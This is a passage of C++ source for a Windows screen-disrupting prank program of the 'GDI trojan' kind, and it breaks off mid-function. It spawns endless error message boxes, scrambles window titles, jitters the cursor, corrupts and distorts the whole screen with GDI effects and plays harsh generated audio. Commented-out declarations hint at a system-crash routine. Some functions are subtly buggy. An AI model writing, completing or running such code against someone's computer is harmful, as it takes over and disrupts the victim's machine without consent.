#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

DWORD WINAPI msg(LPVOID lpParam) {
	while (true) {
		MessageBox(NULL, string(), L"", MB_ICONERROR | MB_YESNO);
	}
	return 1;
}

DWORD WINAPI textz(LPVOID lpParam) {
	while (true) {
		SetWindowText(GetForegroundWindow(), string());
		Sleep(10);
	}
}

DWORD WINAPI cur(LPVOID lpParam) {
	while (true) {
		POINT cpt;
		GetCursorPos(&cpt);
		int x = cpt.x, y = cpt.y;
		SetCursorPos(x + rand() % 2 + rand() % 2, y + rand() % 2 + rand() % 2);
		Sleep(10);
		SetCursorPos(x - rand() % 2 + rand() % 2, y - rand() % 2 + rand() % 2);
		Sleep(10);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t % 99 | t ^ 50) ^ t >> 8 + t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (3 + (4 + (t >> 12) % 2) * (t >> 10) % 7) & 128) * (.15 + (t >> 9) % 2) / 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 3 | t >> 2 | t >> 6) * 30 & (t * 7 << -1 | t >> -2 | t >> 12) * 4;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(12423 * (t >> 6 & t >> 2) | t / 796);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(SquareWave(t, t, t + 320000000));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t * (t >> 9 | 11));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t > 5 | (t >> 2) * (t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 17000, 17000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[17000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t / 444 ^ t / 433));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t * t ^ (t + t >> t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t * (t >> 11 | t >> 6 | t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI sound(LPVOID lpParam) {
	sound1();
	Sleep(30100);
	sound2();
	Sleep(30100);
	sound3();
	Sleep(30100);
	sound4();
	Sleep(30100);
	sound5();
	Sleep(30100);
	sound6();
	Sleep(30100);
	sound7();
	Sleep(30100);
	sound8();
	Sleep(30100);
	sound9();
	Sleep(30100);
	sound10();
	Sleep(30100);
	return 1;
}

DWORD WINAPI logo(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		DrawIcon(hdc, rand() % w, rand() % h, LoadIconA(NULL, (LPCSTR)IDI_WINLOGO));
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI plgblt(LPVOID lpParam) { //credits to NotCCR, but i modified it
	while (true) {
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		HWND hwnd = GetDesktopWindow();
		RECT rect;
		GetWindowRect(hwnd, &rect);
		SelectObject(mdc, hbit);
		POINT lpt[3];
		BLENDFUNCTION ftn = { AC_SRC_OVER, 0, 100, 0 };
		lpt[0].x = rect.left + 6; lpt[0].y = rect.top - 6;
		lpt[1].x = rect.right + 6; lpt[1].y = rect.top + 6;
		lpt[2].x = rect.left - 6; lpt[2].y = rect.bottom + 6;
		PlgBlt(mdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, NULL, 0, 0);
		GdiAlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, ftn);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI textout(LPVOID lpvd) {
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		LPCWSTR text = string();
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(40, 20, 0, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, font);
		TextOutW(hdc, rand() % x, rand() % y, text, strlen((const char*)text));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI profect(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI train(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, 0, 30, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, -h + 30, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI darkpixel(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BITMAPINFO bmp = { { sizeof(BITMAPINFO), w, h, 1, 32, BI_RGB }, 0 };
		BLENDFUNCTION ftn = { AC_SRC_OVER, 0, 10, 0 };
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		int wp = w / 10, hp = h / 10;
		StretchBlt(mdc, rand() % 1, rand() % 1, wp, hp, hdc, rand() % -1, rand() % -1, w, h, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, wp, hp, ftn);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI train1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900AC010E);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900AC010E);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI invcc(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w, y = rand() % h;
		HRGN hrgn = CreateEllipticRgn(x, y, x + 100, y + 100);
		SelectClipRgn(hdc, hrgn);
		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hBrush);
		BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
		DeleteObject(hrgn); DeleteObject(hBrush);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	int i = 0;
	while (true) {
		HDC mhdc = CreateCompatibleDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader.biSize = sizeof(bmi);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = w;
		bmi.bmiHeader.biHeight = h;
		RGBQUAD* rgbDst = NULL;
		HBITMAP bmp = CreateDIBSection(mhdc, &bmi, DIB_RGB_COLORS, (void**)&rgbDst, 0, NULL);
		SelectObject(mhdc, bmp);
		memset(rgbDst, 0, sizeof(RGBQUAD) * w * h);
		HDC hdc = GetDC(NULL);
		BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				FLOAT fx = ((double)(sin(x / 500.f - y / h * 0.1) + i / 5));
				FLOAT fx2 = ((double)(sin(y / 500.f - x / w * 0.1) + i / 5));
				FLOAT fx3 = ((double)(sin(x / 500.f - y / h * 0.1) + i / 5));
				FLOAT fx4 = (fx + fx2 + fx3) * (fx + fx2 + fx3);
				rgbDst[y * w + x].rgbRed -= fx4 - (rgbDst[y * w + x].rgbGreen / 8);
				rgbDst[y * w + x].rgbGreen += fx4 - (rgbDst[y * w + x].rgbBlue / 8);
				rgbDst[y * w + x].rgbBlue -= fx4 - (rgbDst[y * w + x].rgbRed / 8);
			}
		}
		i++;
		BitBlt(hdc, 0, 0, w, h, mhdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(bmp);
		DeleteDC(mhdc);
	}
}

DWORD WINAPI up(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 1, 1, w, h, mdc, -2, 2, SRCCOPY);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		DeleteDC(mdc);
		DeleteObject(bmp);
	}
}

DWORD WINAPI blur(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 3, rand() % 3, w, h, mdc, rand() % 3, rand() % 3, SRCCOPY);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		DeleteDC(mdc);
		DeleteObject(bmp);
	}
}

DWORD WINAPI ballz(LPVOID lpParam) {
	int sx = 1, sy = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, x + 50, y + 50, x - 50, y - 50);
		Ellipse(hdc, x + 45, y + 45, x - 45, y - 45);
		Ellipse(hdc, x + 40, y + 40, x - 40, y - 40);
		Ellipse(hdc, x + 35, y + 35, x - 35, y - 35);
		Ellipse(hdc, x + 30, y + 30, x - 30, y - 30);
		Ellipse(hdc, x + 25, y + 25, x - 25, y - 25);
		Ellipse(hdc, x + 20, y + 20, x - 20, y - 20);
		Ellipse(hdc, x + 15, y + 15, x - 15, y - 15);
		Ellipse(hdc, x + 10, y + 10, x - 10, y - 10);
		Ellipse(hdc, x + 5, y + 5, x - 5, y - 5);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI rotate(LPVOID lpParam) {
	RECT rect;
	POINT lpt[3];
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		GetWindowRect(GetDesktopWindow(), &rect);
		int counter = 30;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + counter;
			lpt[0].y = rect.top - counter;
			lpt[1].x = rect.right + counter;
			lpt[1].y = rect.top + counter;
			lpt[2].x = rect.left - counter;
			lpt[2].y = rect.bottom - counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - counter;
			lpt[0].y = rect.top + counter;
			lpt[1].x = rect.right - counter;
			lpt[1].y = rect.top - counter;
			lpt[2].x = rect.left + counter;
			lpt[2].y = rect.bottom + counter;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(mdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCINVERT);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI plgblt1(LPVOID lpParam) {
	RECT rect;
	POINT lpt[3];
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		GetWindowRect(GetDesktopWindow(), &rect);
		int c = 100;
		if (rand() % 2 == 0) {
			lpt[0].x = rect.left + rand() % 110 - 50;
			lpt[0].y = rect.top + rand() % 210 - 100;
			lpt[1].x = rect.right + rand() % 210 - 100;
			lpt[1].y = rect.top + rand() % 410 - 200;
			lpt[2].x = rect.left + c - rand() % 210 - c;
			lpt[2].y = rect.bottom - c + rand() % 210 - c;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			lpt[0].x = rect.left - rand() % 110 + 50;
			lpt[0].y = rect.top - rand() % 210 + 100;
			lpt[1].x = rect.right - rand() % 210 + 100;
			lpt[1].y = rect.top - rand() % 410 + 200;
			lpt[2].x = rect.left - c + rand() % 210 + c;
			lpt[2].y = rect.bottom + c - rand() % 210 + c;
			PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(mdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, 0x999999);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HDC mdc = CreateCompatibleDC(hdc);
	PRGBTRIPLE triple;
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	HBITMAP hbm = CreateDIBSection(hdc, &bmi, 0, (void**)&triple, 0, 0);
	while (true) {
		hdc = GetDC(0);
		SelectObject(mdc, hbm);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			triple[i].rgbtRed += int(sqrt(i)) | (triple[i].rgbtRed) + 255;
			triple[i].rgbtGreen += int(sqrt(i)) | (triple[i].rgbtGreen) + 255;
			triple[i].rgbtBlue += int(sqrt(i)) | (triple[i].rgbtBlue) + 255;
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI up1(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, -2, -2, w, h, mdc, 1, 1, SRCCOPY);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		DeleteDC(mdc);
		DeleteObject(bmp);
	}
}

DWORD WINAPI cur1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		CURSORINFO pci;
		pci.cbSize = sizeof(pci);
		GetCursorInfo(&pci);
		DrawIcon(hdc, rand() % w, rand() % h, pci.hCursor);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI shader3(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(30));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
